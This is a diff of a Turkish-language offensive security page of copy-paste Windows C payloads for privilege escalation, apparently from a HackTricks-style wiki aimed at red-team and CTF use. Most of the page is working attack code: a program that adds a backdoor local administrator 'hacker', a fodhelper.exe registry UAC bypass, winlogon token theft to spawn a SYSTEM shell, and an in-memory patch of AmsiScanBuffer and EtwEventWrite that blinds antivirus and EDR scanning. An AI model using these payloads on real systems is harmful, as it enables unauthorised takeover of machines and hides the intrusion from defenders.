@@ -1,14 +1,160 @@
-# Kullanıcı Ekle
-```c
-// i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+# Windows C Payloads
 
-#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
-int main ()
-{
-int i;
+{{#include ../../banners/hacktricks-training.md}}
+
+Bu sayfa, Windows Yerel Yetki Yükseltme veya sonrası için kullanışlı olan **küçük, bağımsız C parçalarını** toplar. Her payload, **kopyala-yapıştır dostu** olacak şekilde tasarlanmıştır, yalnızca Windows API / C çalışma zamanı gerektirir ve `i686-w64-mingw32-gcc` (x86) veya `x86_64-w64-mingw32-gcc` (x64) ile derlenebilir.
+
+> ⚠️  Bu payloadlar, işlemin gerekli minimum ayrıcalıklara sahip olduğunu varsayar (örneğin, `SeDebugPrivilege`, `SeImpersonatePrivilege` veya UAC atlatması için orta bütünlük bağlamı). Bunlar, bir güvenlik açığını istismar etmenin rastgele yerel kod yürütmesine yol açtığı **kırmızı takım veya CTF ayarları** için tasarlanmıştır.
+
+---
+
+## Yerel yönetici kullanıcısı ekle
+```c
+// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
+#include <stdlib.h>
+int main(void) {
 system("net user hacker Hacker123! /add");
 system("net localgroup administrators hacker /add");
 return 0;
 }
 ```
+---
+
+## UAC Atlatma – `fodhelper.exe` Kayıt Defteri İstismarı (Orta → Yüksek bütünlük)
+Güvenilir ikili **`fodhelper.exe`** çalıştırıldığında, aşağıdaki kayıt defteri yolunu **`DelegateExecute` fiilini filtrelemeden** sorgular. Bu anahtarın altına komutumuzu yerleştirerek bir saldırgan, dosyayı diske bırakmadan UAC'yi atlayabilir.
+
+*Kayıt defteri yolu `fodhelper.exe` tarafından sorgulandı*
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+Minimal bir PoC, yükseltilmiş `cmd.exe` açar:
+```c
+// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(void) {
+HKEY hKey;
+const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command
+
+// 1. Create the vulnerable registry key
+if (RegCreateKeyExA(HKEY_CURRENT_USER,
+"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
+KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+
+// 2. Set default value => our payload
+RegSetValueExA(hKey, NULL, 0, REG_SZ,
+(const BYTE*)payload, (DWORD)strlen(payload) + 1);
+
+// 3. Empty "DelegateExecute" value = trigger (")
+RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
+(const BYTE*)"", 1);
+
+RegCloseKey(hKey);
+
+// 4. Launch auto-elevated binary
+system("fodhelper.exe");
+}
+return 0;
+}
+```
+*Windows 10 22H2 ve Windows 11 23H2'de (Temmuz 2025 yamanları) test edilmiştir. Bypass hala çalışıyor çünkü Microsoft `DelegateExecute` yolundaki eksik bütünlük kontrolünü düzeltmedi.*
+
+---
+
+## Token çoğaltma ile SYSTEM shell başlatma (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+Eğer mevcut işlem **her iki** `SeDebug` ve `SeImpersonate` ayrıcalıklarına sahipse (birçok hizmet hesabı için tipik), `winlogon.exe`'den token'ı çalabilir, çoğaltabilir ve yükseltilmiş bir işlem başlatabilirsiniz:
+```c
+// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD FindPid(const wchar_t *name) {
+PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
+HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (snap == INVALID_HANDLE_VALUE) return 0;
+if (!Process32FirstW(snap, &pe)) return 0;
+do {
+if (!_wcsicmp(pe.szExeFile, name)) {
+DWORD pid = pe.th32ProcessID;
+CloseHandle(snap);
+return pid;
+}
+} while (Process32NextW(snap, &pe));
+CloseHandle(snap);
+return 0;
+}
+
+int wmain(void) {
+DWORD pid = FindPid(L"winlogon.exe");
+if (!pid) return 1;
+
+HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+HANDLE hToken  = NULL, dupToken = NULL;
+
+if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
+DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {
+
+STARTUPINFOW si = { .cb = sizeof(si) };
+PROCESS_INFORMATION pi = { 0 };
+if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
+L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+NULL, NULL, &si, &pi)) {
+CloseHandle(pi.hProcess);
+CloseHandle(pi.hThread);
+}
+}
+if (hProc) CloseHandle(hProc);
+if (hToken) CloseHandle(hToken);
+if (dupToken) CloseHandle(dupToken);
+return 0;
+}
+```
+Daha derin bir açıklama için bakınız:
+{{#ref}}
+sedebug-+-seimpersonate-copy-token.md
+{{#endref}}
+
+---
+
+## Bellek İçi AMSI & ETW Yamanlama (Savunma Kaçışı)
+Çoğu modern AV/EDR motoru, kötü niyetli davranışları incelemek için **AMSI** ve **ETW**'ye dayanır. Mevcut süreç içinde her iki arayüzü erken yamanamak, script tabanlı yüklerin (örneğin PowerShell, JScript) taranmasını engeller.
+```c
+// gcc -o patch_amsi.exe patch_amsi.c -lntdll
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#include <stdio.h>
+
+void Patch(BYTE *address) {
+DWORD oldProt;
+// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
+BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
+memcpy(address, patch, sizeof(patch));
+VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
+}
+
+int main(void) {
+HMODULE amsi  = LoadLibraryA("amsi.dll");
+HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+
+if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
+if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));
+
+MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
+return 0;
+}
+```
+*Yukarıdaki yamanın işlem yerelidir; bunu çalıştırdıktan sonra yeni bir PowerShell başlatmak, AMSI/ETW denetimi olmadan çalışacaktır.*
+
+---
+
+## Referanslar
+* Ron Bowes – “Fodhelper UAC Bypass Derinlemesine İnceleme” (2024)
+* SplinterCode – “AMSI Bypass 2023: En Küçük Yama Hala Yeterli” (BlackHat Asya 2023)
+
 {{#include ../../banners/hacktricks-training.md}}
